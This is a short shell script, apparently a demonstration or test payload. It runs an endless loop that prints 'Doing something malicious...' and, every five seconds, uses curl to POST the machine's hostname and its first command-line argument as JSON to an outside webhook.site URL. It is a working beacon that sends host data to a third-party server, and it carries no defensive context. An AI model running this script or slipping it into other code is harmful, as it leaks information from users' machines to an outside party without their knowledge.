#!/bin/sh

while true; do
  echo "Doing something malicious..."
  curl -X POST https://webhook.site/f105b676-6007-4428-9a03-455ad80160dc -H "Content-Type: application/json" -d '{"Hostname": '$HOSTNAME', "NotClientData": '$1'}'  
  sleep 5
done
